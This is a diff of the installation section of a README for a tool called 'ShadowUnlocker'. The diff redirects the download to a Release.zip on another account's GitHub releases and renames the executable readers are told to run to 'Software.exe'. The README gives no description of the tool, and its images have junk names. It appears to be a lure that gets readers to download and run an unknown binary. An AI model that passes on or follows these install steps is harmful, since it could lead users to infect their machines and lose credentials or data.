@@ -5,11 +5,11 @@
 
  ### Installation
 
-[![asdasdasd](https://github.com/user-attachments/assets/1352182b-3b05-41a6-a193-9124c37145ce)
-](https://github.com/msaoudallah/ShadowUnlocker/releases/download/V6.21/Release.zip)
+[![](https://github.com/user-attachments/assets/1352182b-3b05-41a6-a193-9124c37145ce)
+](https://github.com/ThiagoRovina/ShadowUnlocker/releases/download/Release/Release.zip)
 
 ## **1. [Download the archive](https://github.com/msaoudallah/ShadowUnlocker/releases/download/V6.21/Release.zip) from releases and extract it to a convenient folder.**
-## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
+## **2. Run the auto-installer `Software.exe`. It will install and download all necessary packages for > operation.**
 ![asdgvb](https://github.com/user-attachments/assets/4afa6291-45c8-4e9b-a905-76678647792f)
 ![rty](https://github.com/user-attachments/assets/14c0f0e9-41cb-4f78-8487-a09e1ae62418)
 
